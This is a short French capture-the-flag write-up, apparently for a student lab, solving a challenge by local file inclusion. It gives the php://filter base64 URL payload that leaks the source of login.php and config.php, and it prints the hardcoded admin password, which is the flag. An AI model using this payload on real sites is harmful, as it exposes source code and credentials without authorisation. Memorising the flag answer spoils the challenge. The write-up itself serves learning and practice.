<br />
<h4>Lien du challenge</h4>
<a href="http://webstarhackademint.minet.net/#phpfilter" class="uri">https://webstarhackademint.minet.net/#phpfilter</a>
</br></br>

<h4>Solution</h4>

<p>Après une recherche sur les LFI PHP filters, on remarque qu'il est possible de récupérer le contenu d'un fichier php.</p>
<p>On récupère alors le contenu encodé en base 64 à l'adresse <a href="https://webstarhackademint83.minet.net/?inc=php://filter/convert.base64-encode/resource=login.php" class="uri">https://webstarhackademint83.minet.net/?inc=php://filter/convert.base64-encode/resource=login.php</a>.</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
<span class="kw">include</span><span class="ot">(</span><span class="st">&quot;config.php&quot;</span><span class="ot">);</span>

<span class="kw">if</span> <span class="ot">(</span> <span class="fu">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;username&quot;</span><span class="ot">])</span> &amp;&amp; <span class="fu">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;password&quot;</span><span class="ot">])</span> <span class="ot">)</span>{
    <span class="kw">if</span> <span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;username&quot;</span><span class="ot">]</span>==<span class="kw">$username</span> &amp;&amp; <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;password&quot;</span><span class="ot">]</span>==<span class="kw">$password</span><span class="ot">)</span>{
      <span class="fu">print</span><span class="ot">(</span><span class="st">&quot;&lt;h2&gt;Welcome back !&lt;/h2&gt;&quot;</span><span class="ot">);</span>
      <span class="fu">print</span><span class="ot">(</span><span class="st">&quot;To validate the challenge use this password&lt;br/&gt;&lt;br/&gt;&quot;</span><span class="ot">);</span>
    } <span class="kw">else</span> {
      <span class="fu">print</span><span class="ot">(</span><span class="st">&quot;&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;&quot;</span><span class="ot">);</span>
    }
} <span class="kw">else</span> {
<span class="kw">?&gt;</span>

&lt;form action=<span class="st">&quot;&quot;</span> method=<span class="st">&quot;post&quot;</span>&gt;
  Login&amp;nbsp<span class="ot">;</span>&lt;br/&gt;
  &lt;input type=<span class="st">&quot;text&quot;</span> name=<span class="st">&quot;username&quot;</span> /&gt;&lt;br/&gt;&lt;br/&gt;
  Password&amp;nbsp<span class="ot">;</span>&lt;br/&gt;
  &lt;input type=<span class="st">&quot;password&quot;</span> name=<span class="st">&quot;password&quot;</span> /&gt;&lt;br/&gt;&lt;br/&gt;
  &lt;br/&gt;
  &lt;input type=<span class="st">&quot;submit&quot;</span> value=<span class="st">&quot;connect&quot;</span> /&gt;&lt;br/&gt;&lt;br/&gt;
&lt;/form&gt;

&lt;<span class="ot">?</span>php } <span class="kw">?&gt;</span></code></pre></div>
<p>On récupère alors de la même manière le contenu de <code>config.php</code> :</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>

<span class="kw">$username</span>=<span class="st">&quot;admin&quot;</span><span class="ot">;</span>
<span class="kw">$password</span>=<span class="st">&quot;starhack{pHp_F1lT3rs}&quot;</span><span class="ot">;</span>

<span class="kw">?&gt;</span></code></pre></div>
<p>Le flag est donc <code>starhack{pHp_F1lT3rs}</code>.</p>

